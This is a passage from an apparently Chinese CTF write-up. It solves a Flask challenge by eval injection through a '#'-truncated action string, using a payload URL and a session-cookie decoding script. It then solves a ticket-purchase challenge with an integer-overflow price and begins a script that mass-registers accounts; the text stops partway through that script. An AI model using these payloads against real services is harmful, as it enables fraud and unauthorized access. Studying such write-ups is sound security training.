    <span class="k">if</span> <span class="n">resp</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">resp</span> <span class="o">==</span> <span class="s1">''</span><span class="p">:</span> <span class="n">resp</span> <span class="o">=</span> <span class="p">(</span><span class="s1">'404 NOT FOUND'</span><span class="p">,</span> <span class="mi">404</span><span class="p">)</span> 
    <span class="n">session</span><span class="o">.</span><span class="n">modified</span> <span class="o">=</span> <span class="bp">True</span> 
    <span class="k">return</span> <span class="n">resp</span> 

<span class="nd">@app.route</span><span class="p">(</span><span class="n">url_prefix</span><span class="o">+</span><span class="s1">'/'</span><span class="p">)</span> 
<span class="k">def</span> <span class="nf">entry_point</span><span class="p">():</span> 
    <span class="n">querystring</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">query_string</span><span class="p">)</span> 
    <span class="n">request</span><span class="o">.</span><span class="n">event_queue</span> <span class="o">=</span> <span class="p">[]</span> 
    <span class="k">if</span> <span class="n">querystring</span> <span class="o">==</span> <span class="s1">''</span> <span class="ow">or</span> <span class="p">(</span><span class="ow">not</span> <span class="n">querystring</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">'action:'</span><span class="p">))</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">querystring</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span> 
        <span class="n">querystring</span> <span class="o">=</span> <span class="s1">'action:index;False#False'</span> 
    <span class="k">if</span> <span class="s1">'num_items'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span> 
        <span class="n">session</span><span class="p">[</span><span class="s1">'num_items'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span> 
        <span class="n">session</span><span class="p">[</span><span class="s1">'points'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span> 
        <span class="n">session</span><span class="p">[</span><span class="s1">'log'</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span> 
    <span class="n">request</span><span class="o">.</span><span class="n">prev_session</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">session</span><span class="p">)</span> 
    <span class="n">trigger_event</span><span class="p">(</span><span class="n">querystring</span><span class="p">)</span> 
    <span class="k">return</span> <span class="n">execute_event_loop</span><span class="p">()</span> 

<span class="c1"># handlers/functions below -------------------------------------- </span>

<span class="k">def</span> <span class="nf">view_handler</span><span class="p">(</span><span class="n">args</span><span class="p">):</span> 
    <span class="n">page</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> 
    <span class="n">html</span> <span class="o">=</span> <span class="s1">''</span> 
    <span class="n">html</span> <span class="o">+=</span> <span class="s1">'[INFO] you have {} diamonds, {} points now.&lt;br /&gt;'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">'num_items'</span><span class="p">],</span> <span class="n">session</span><span class="p">[</span><span class="s1">'points'</span><span class="p">])</span> 
    <span class="k">if</span> <span class="n">page</span> <span class="o">==</span> <span class="s1">'index'</span><span class="p">:</span> 
        <span class="n">html</span> <span class="o">+=</span> <span class="s1">'&lt;a href="./?action:index;True</span><span class="si">%23F</span><span class="s1">alse"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span> 
        <span class="n">html</span> <span class="o">+=</span> <span class="s1">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span> 
        <span class="n">html</span> <span class="o">+=</span> <span class="s1">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span> 
    <span class="k">elif</span> <span class="n">page</span> <span class="o">==</span> <span class="s1">'shop'</span><span class="p">:</span> 
        <span class="n">html</span> <span class="o">+=</span> <span class="s1">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span> 
    <span class="k">elif</span> <span class="n">page</span> <span class="o">==</span> <span class="s1">'reset'</span><span class="p">:</span> 
        <span class="k">del</span> <span class="n">session</span><span class="p">[</span><span class="s1">'num_items'</span><span class="p">]</span> 
        <span class="n">html</span> <span class="o">+=</span> <span class="s1">'Session reset.&lt;br /&gt;'</span> 
    <span class="n">html</span> <span class="o">+=</span> <span class="s1">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span> 
    <span class="k">return</span> <span class="n">html</span> 

<span class="k">def</span> <span class="nf">index_handler</span><span class="p">(</span><span class="n">args</span><span class="p">):</span> 
    <span class="n">bool_show_source</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> 
    <span class="n">bool_download_source</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> 
    <span class="k">if</span> <span class="n">bool_show_source</span> <span class="o">==</span> <span class="s1">'True'</span><span class="p">:</span> 

        <span class="n">source</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'eventLoop.py'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> 
        <span class="n">html</span> <span class="o">=</span> <span class="s1">''</span> 
        <span class="k">if</span> <span class="n">bool_download_source</span> <span class="o">!=</span> <span class="s1">'True'</span><span class="p">:</span> 
            <span class="n">html</span> <span class="o">+=</span> <span class="s1">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span> 
            <span class="n">html</span> <span class="o">+=</span> <span class="s1">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span> 

        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">source</span><span class="p">:</span> 
            <span class="k">if</span> <span class="n">bool_download_source</span> <span class="o">!=</span> <span class="s1">'True'</span><span class="p">:</span> 
                <span class="n">html</span> <span class="o">+=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'&amp;'</span><span class="p">,</span><span class="s1">'&amp;amp;'</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'</span><span class="se">\t</span><span class="s1">'</span><span class="p">,</span> <span class="s1">'&amp;nbsp;'</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span><span class="s1">'&amp;nbsp;'</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'&lt;'</span><span class="p">,</span> <span class="s1">'&amp;lt;'</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span><span class="s1">'&amp;gt;'</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="s1">'&lt;br /&gt;'</span><span class="p">)</span> 
            <span class="k">else</span><span class="p">:</span> 
                <span class="n">html</span> <span class="o">+=</span> <span class="n">line</span> 
        <span class="n">source</span><span class="o">.</span><span class="n">close</span><span class="p">()</span> 

        <span class="k">if</span> <span class="n">bool_download_source</span> <span class="o">==</span> <span class="s1">'True'</span><span class="p">:</span> 
            <span class="n">headers</span> <span class="o">=</span> <span class="p">{}</span> 
            <span class="n">headers</span><span class="p">[</span><span class="s1">'Content-Type'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'text/plain'</span> 
            <span class="n">headers</span><span class="p">[</span><span class="s1">'Content-Disposition'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'attachment; filename=serve.py'</span> 
            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span> 
        <span class="k">else</span><span class="p">:</span> 
            <span class="k">return</span> <span class="n">html</span> 
    <span class="k">else</span><span class="p">:</span> 
        <span class="n">trigger_event</span><span class="p">(</span><span class="s1">'action:view;index'</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">buy_handler</span><span class="p">(</span><span class="n">args</span><span class="p">):</span> 
    <span class="n">num_items</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> 
    <span class="k">if</span> <span class="n">num_items</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span> <span class="k">return</span> <span class="s1">'invalid number({}) of diamonds to buy&lt;br /&gt;'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> 
    <span class="n">session</span><span class="p">[</span><span class="s1">'num_items'</span><span class="p">]</span> <span class="o">+=</span> <span class="n">num_items</span>  
    <span class="n">trigger_event</span><span class="p">([</span><span class="s1">'func:consume_point;{}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num_items</span><span class="p">),</span> <span class="s1">'action:view;index'</span><span class="p">])</span> 

<span class="k">def</span> <span class="nf">consume_point_function</span><span class="p">(</span><span class="n">args</span><span class="p">):</span> 
    <span class="n">point_to_consume</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> 
    <span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s1">'points'</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">point_to_consume</span><span class="p">:</span> <span class="k">raise</span> <span class="n">RollBackException</span><span class="p">()</span> 
    <span class="n">session</span><span class="p">[</span><span class="s1">'points'</span><span class="p">]</span> <span class="o">-=</span> <span class="n">point_to_consume</span> 

<span class="k">def</span> <span class="nf">show_flag_function</span><span class="p">(</span><span class="n">args</span><span class="p">):</span> 
    <span class="n">flag</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> 
    <span class="c1">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. </span>
    <span class="k">return</span> <span class="s1">'You naughty boy! ;) &lt;br /&gt;'</span> 

<span class="k">def</span> <span class="nf">get_flag_handler</span><span class="p">(</span><span class="n">args</span><span class="p">):</span> 
    <span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s1">'num_items'</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">:</span> 
        <span class="n">trigger_event</span><span class="p">(</span><span class="s1">'func:show_flag;'</span> <span class="o">+</span> <span class="n">FLAG</span><span class="p">())</span> <span class="c1"># show_flag_function has been disabled, no worries </span>
    <span class="n">trigger_event</span><span class="p">(</span><span class="s1">'action:view;index'</span><span class="p">)</span> 

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span> 
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">)</span>
</pre></div>
<p>网址实现各种功能，是通过解析<code>query_string</code>进行跳转的，具体可以查看<code>execute_event_loop</code>函数代码。<code>query_string</code>示例如下：</p>
<pre><code>http://116.85.48.107:5002/d5afe1f66147e857/?action:buy;1
http://116.85.48.107:5002/d5afe1f66147e857/?action:view;shop</code></pre>
<p>提取关键代码测试，可以看到更加直观，代码如下：</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">get_mid_str</span><span class="p">(</span><span class="n">haystack</span><span class="p">,</span> <span class="n">prefix</span><span class="p">,</span> <span class="n">postfix</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="n">haystack</span> <span class="o">=</span> <span class="n">haystack</span><span class="p">[</span><span class="n">haystack</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">prefix</span><span class="p">)</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">):]</span>
    <span class="k">if</span> <span class="n">postfix</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">haystack</span> <span class="o">=</span> <span class="n">haystack</span><span class="p">[:</span><span class="n">haystack</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">postfix</span><span class="p">)]</span>
    <span class="k">return</span> <span class="n">haystack</span>

<span class="k">def</span> <span class="nf">ACTION_handler</span><span class="p">():</span><span class="k">pass</span>

<span class="n">event</span> <span class="o">=</span> <span class="s1">'action:ACTION;ARGS0#ARGS1#ARGS2'</span>
<span class="n">is_action</span> <span class="o">=</span> <span class="n">event</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'a'</span>
<span class="n">action</span> <span class="o">=</span> <span class="n">get_mid_str</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="s1">':'</span><span class="p">,</span> <span class="s1">';'</span><span class="p">)</span>
<span class="k">print</span> <span class="s1">'[!] action:'</span><span class="p">,</span><span class="n">action</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">get_mid_str</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">action</span><span class="o">+</span><span class="s1">';'</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'#'</span><span class="p">)</span>
<span class="k">print</span> <span class="s1">'[!] args:'</span><span class="p">,</span><span class="n">args</span>
<span class="n">event_handler</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">action</span> <span class="o">+</span> <span class="p">(</span><span class="s1">'_handler'</span> <span class="k">if</span> <span class="n">is_action</span> <span class="k">else</span> <span class="s1">'_function'</span><span class="p">))</span>
<span class="k">print</span> <span class="s1">'[!] event_handler:'</span><span class="p">,</span><span class="n">event_handler</span>
</pre></div>
<p>运行结果：</p>
<pre><code>[!] action: ACTION
[!] args: ['ARGS0', 'ARGS1', 'ARGS2']
[!] event_handler: &lt;function ACTION_handler at 0x00000000035A4B38&gt;</code></pre>
<p><code>event_handler</code>是用<code>eval</code>进行拼接，从而得到对应的处理函数，<code>eval</code>函数本质是将字符串str当成有效的表达式来求值并返回计算结果，程序过滤了大部分的特殊符号，导致我们不能随意进行代码注入，不过由于<code>ARGS</code>是使用<code>#</code>进行分隔，而<code>#</code>在python代码中是注释符，在<code>action</code>中加入<code>#</code>，可以把后面<code>_handler</code>注释掉。上面的代码用<code>event = 'action:str#;ARGS0#ARGS1#ARGS2'</code>进行测试一下：</p>
<pre><code>[!] action: str#
[!] args: ['ARGS0', 'ARGS1', 'ARGS2']
[!] event_handler: &lt;type 'str'&gt;</code></pre>
<p>现在，我们可以控制<code>event_handler</code>运行指定的函数，不过还有一个问题是<code>FLAG()</code>函数是不带参数的，而<code>args</code>为<code>list</code>，直接传入<code>action:FLAG;</code>将产生报错。</p>
<pre><code>TypeError: FLAG() takes no arguments (1 given)</code></pre>
<p>直接调用<code>FLAG()</code>函数的方法走不通了，由于传入参数必须是<code>list</code>类型，python自带的全局函数也没有可以用（如果有求告知~），那么只能考虑自带函数。自带的函数不多，不难找到<code>trigger_event</code>。</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">trigger_event</span><span class="p">(</span><span class="n">event</span><span class="p">):</span>
    <span class="n">session</span><span class="p">[</span><span class="s1">'log'</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">event</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">'log'</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">:</span> <span class="n">session</span><span class="p">[</span><span class="s1">'log'</span><span class="p">]</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">'log'</span><span class="p">][</span><span class="o">-</span><span class="mi">5</span><span class="p">:]</span>
    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="o">==</span> <span class="nb">type</span><span class="p">([]):</span>
        <span class="n">request</span><span class="o">.</span><span class="n">event_queue</span> <span class="o">+=</span> <span class="n">event</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">request</span><span class="o">.</span><span class="n">event_queue</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">event</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">execute_event_loop</span><span class="p">():</span>
    <span class="n">valid_event_chars</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="s1">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="p">)</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">event_queue</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">event</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">event_queue</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="c1"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span>
        <span class="n">request</span><span class="o">.</span><span class="n">event_queue</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">event_queue</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
        <span class="o">...</span>
</pre></div>
<p>参数<code>event</code>为<code>list</code>类型，<code>execute_event_loop</code>按顺序处理<code>request.event_queue</code>所有<code>event</code>，我们可以考虑构造一套组合拳来获取flag。具体构造思路如下：</p>
<ol>
<li>程序调用<code>FLAG()</code>的地方只有一个，就是<code>get_flag_handler()</code>，对应的<code>event1=action:get_flag;</code>；</li>
<li>
<code>get_flag_handler()</code>会判断<code>session['num_items']&gt;=5</code>，因此需要购买5个以上的钻石，对应的<code>event2=action:buy;5</code>；</li>
<li>传入<code>query_string=action:trigger_event#;{event1}#{event2}</code>，利用<code>#</code>截断，运行<code>trigger_event([event1,event2])</code>
</li>
</ol>
<p>此外，还有两个问题需要解决一下</p>
<ol>
<li>
<code>show_flag_function()</code>把返回的FLAG注释掉了，FLAG只会加入到<code>show_flag_function()</code>参数中。</li>
<li>
<code>buy_handler()</code>后会调用<code>consume_point_function()</code>检查<code>point</code>是否足够，不然就会回滚。</li>
</ol>
<p><code>trigger_event</code>有一句代码<code>session['log'].append(event)</code>，会把记录各种函数的调用，那么自然会把<code>trigger_event('func:show_flag;'+FLAG())</code>存在放在<code>session['log']</code>中。留意到<code>execute_event_loop</code>是按先后顺序进行函数调用，因此<code>buy_handler()</code>后并不会马上执行<code>consume_point_function()</code>，如果后面紧跟是<code>show_flag_function()</code>，并不会受回滚影响。由于flag存放在session中，需要解密一下cookie，flask的session问题具体可以看看p神博客，<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank">客户端 session 导致的安全问题</a></p>
<p>最终payload：</p>
<pre><code>http://116.85.48.107:5002/d5afe1f66147e857/?action:trigger_event%23;action:buy;7%23action:get_flag;

ERROR! All transactions have been cancelled. 
Go back to index.html</code></pre>
<p>获取到的cookie</p>
<pre><code>Set-Cookie: session=.eJyNjlFLwzAAhP-K5HkPbersUujLcCkM2uCsTRoRaZo5m6VZsOvmMvrfVwQFmQ--Hdzdd3cGercB0fMZ3AgQgZJmXkVRT8zqVFFpOFu-cca1MA-KQKxkog9C2UaybZidsvcyWFkBb-84LDwGeVfSOgTD5ArXLv113gWjdeVILTFqRYINOcYxGF5-2twUfemsEnDqJPU1C-aHik494ur4D5LhlrM6HBNbzjZfpN8gVyUo-H6ZBqWXFjMnVdZLPPtM7-dHBjHh45l8gfNHH6l0gT5S-vTPMWD69rXZr9sORP4E2F1j9qOEwwXM_XDJ.D5b-8w.YcblUXhGWeGzHVT6qLNwR2zCOV4; HttpOnly; Path=/</code></pre>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">zlib</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
<span class="kn">from</span> <span class="nn">flask.sessions</span> <span class="kn">import</span> <span class="n">URLSafeTimedSerializer</span><span class="p">,</span><span class="n">session_json_serializer</span>
<span class="kn">from</span> <span class="nn">itsdangerous</span> <span class="kn">import</span> <span class="n">base64_decode</span>

<span class="k">def</span> <span class="nf">decryption</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">payload</span><span class="p">,</span> <span class="n">sig</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="sa">b</span><span class="s1">'.'</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">payload</span><span class="p">,</span> <span class="n">timestamp</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="sa">b</span><span class="s1">'.'</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

    <span class="n">decompress</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="n">payload</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">'.'</span><span class="p">):</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
        <span class="n">decompress</span> <span class="o">=</span> <span class="bp">True</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">base64_decode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s1">'Could not base64 decode the payload because of '</span>
                         <span class="s1">'an exception'</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">decompress</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s1">'Could not zlib decompress the payload before '</span>
                             <span class="s1">'decoding the payload'</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">session_json_serializer</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">sessions</span> <span class="o">=</span> <span class="s1">'.eJyNjlFLwzAAhP-K5HkPbersUujLcCkM2uCsTRoRaZo5m6VZsOvmMvrfVwQFmQ--Hdzdd3cGercB0fMZ3AgQgZJmXkVRT8zqVFFpOFu-cca1MA-KQKxkog9C2UaybZidsvcyWFkBb-84LDwGeVfSOgTD5ArXLv113gWjdeVILTFqRYINOcYxGF5-2twUfemsEnDqJPU1C-aHik494ur4D5LhlrM6HBNbzjZfpN8gVyUo-H6ZBqWXFjMnVdZLPPtM7-dHBjHh45l8gfNHH6l0gT5S-vTPMWD69rXZr9sORP4E2F1j9qOEwwXM_XDJ.D5b-8w.YcblUXhGWeGzHVT6qLNwR2zCOV4'</span>
<span class="n">PAYLOAD</span> <span class="o">=</span> <span class="n">decryption</span><span class="p">(</span><span class="n">sessions</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="k">print</span> <span class="n">PAYLOAD</span>
</pre></div>
<p>查看session的解析结果，函数的调用过程更加一目了然了。</p>
<pre><code>{u'points': 2, u'num_items': 1, u'log': ['action:trigger_event#;action:buy;7#action:get_flag;', ['action:buy;7', 'action:get_flag;'], ['func:consume_point;7', 'action:view;index'], 'func:show_flag;3v41_3v3nt_100p_aNd_fLASK_c0Ok1e', 'action:view;index']}</code></pre>
<h3 data-content="1" id="baf799bfa1171042a75af77b4f8eee1e">大吉大利，今晚吃鸡</h3>
<p><a href="http://117.51.147.155:5050/index.html" target="_blank">http://117.51.147.155:5050/index.html</a></p>
<p>正常情况下，新注册用户余额只有100，门票需要2000，是不够钱买门票，不过可以利用整数溢出</p>
<p>32位系统<code>unsigned int</code>范围为<code>0～4294967295</code>，最大数<code>+1</code>后会回绕变成<code>0</code>，修改订单<code>ticket_price=4294967296</code></p>
<pre><code>GET /ctf/api/buy_ticket?ticket_price=4294967296</code></pre>
<p>后面拿到源码证实了猜想，对于大于32位的数字，程序进行了截断，导致了整数溢出。</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">num64_to_32</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
    <span class="n">str_num</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">str_num</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">66</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">if</span> <span class="mi">34</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">str_num</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">66</span><span class="p">:</span>
        <span class="n">str_64</span> <span class="o">=</span> <span class="n">str_num</span><span class="p">[</span><span class="o">-</span><span class="mi">32</span><span class="p">:]</span>
        <span class="n">result</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">str_64</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">result</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">str_num</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">34</span><span class="p">:</span>
        <span class="n">result</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">str_num</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">result</span>
</pre></div>
<p>这时去点支付，可以0元购买入场券。进入<code>http://117.51.147.155:5050/index.html#/main/result</code>后，可以输入ID和ticket移除对手。</p>
<p>思路是不停注册一堆新用户，拿到ticket，加入游戏，然后让玩家移除机器人，当移除id不重复的100个时，拿到flag。</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">uuid</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
        <span class="n">name</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())[:</span><span class="mi">10</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'-'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>

        <span class="n">url</span> <span class="o">=</span> <span class="n">base_url</span> <span class="o">+</span> <span class="s2">"/ctf/api/register?name=</span><span class="si">%s</span><span class="s2">&amp;password=12345678"</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">'code'</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
            <span class="k">continue</span>
        <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># 如果不sleep一下，后面可能会无法买ticket</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">base_url</span> <span class="o">+</span> <span class="s1">'/ctf/api/buy_ticket?ticket_price=4294967296'</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="n">bill_id</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">'data'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">'bill_id'</span><span class="p">]</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">base_url</span> <span class="o">+</span> <span class="s1">'/ctf/api/pay_ticket?bill_id=</span><span class="si">%s</span><span class="s1">'</span> <span class="o">%</span> <span class="n">bill_id</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

        <span class="n">your_id</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">'data'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">'your_id'</span><span class="p">]</span>
